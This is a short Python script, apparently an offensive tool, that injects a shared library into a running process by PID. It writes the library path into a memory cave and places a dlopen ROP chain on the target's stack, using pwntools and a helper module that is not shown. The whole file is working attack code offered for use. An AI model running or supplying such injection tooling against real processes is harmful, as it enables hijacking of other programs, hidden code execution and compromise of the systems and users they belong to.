#!/usr/bin/env python3
import argparse
from exploitutils import *
from pwn import *

context.arch = 'amd64'

class ProcessInjector:
    """
    Handles the process injection, including setting up the target process,
    constructing and writing the ROP chain, and interacting with the process.
    """

    def __init__(self, target_pid, so_path):
        self.target_pid = target_pid
        self.so_path = so_path
        self.target_process = None
        self.exploit_utils = None

    def start_target_process(self):
        """
        Initialize the ExploitUtils object with the targeted pid.
        """
        self.exploit_utils = ExploitUtils(self.target_pid)

    def inject_so(self):
        """
        Perform the injection of the shared object (.so) file using a crafted ROP chain.
        """
        # Retrieve current syscall information
        syscall_info = self.exploit_utils.parse_proc_syscall()
        log.info(f"Current RSP: {hex(syscall_info.rsp)}")

        # Find a memory cave for storing the SO path
        bss_cave = self.exploit_utils.find_cave(cave_size=len(self.so_path))

        # Create a ROP chain for calling dlopen with the shared object path
        dlopen_rop_chain = self.exploit_utils.dlopen_rop(address=bss_cave, so_path=self.so_path)

        # Write the SO path to the memory cave
        self.exploit_utils.write_memory(address=bss_cave, content=self.so_path.encode())

        # Write the ROP chain to the stack at the current RSP
        self.exploit_utils.write_memory(address=syscall_info.rsp, content=dlopen_rop_chain)


def parse_args():
    """
    Parse command-line arguments.
    """
    parser = argparse.ArgumentParser(description="[*] Process injection on a vulnerable binary.")
    parser.add_argument("target_pid", help="[*] PID of the target process.")
    parser.add_argument("so", help="[*] Path to the shared object (.so) file.")
    return parser.parse_args()


def main():
    """
    Main function to orchestrate the process injection.
    """
    # Parse command-line arguments
    user_args = parse_args()

    # Initialize and start the injection process
    injector = ProcessInjector(user_args.target_pid, user_args.so)
    injector.start_target_process()
    injector.inject_so()


if __name__ == "__main__":
    main()
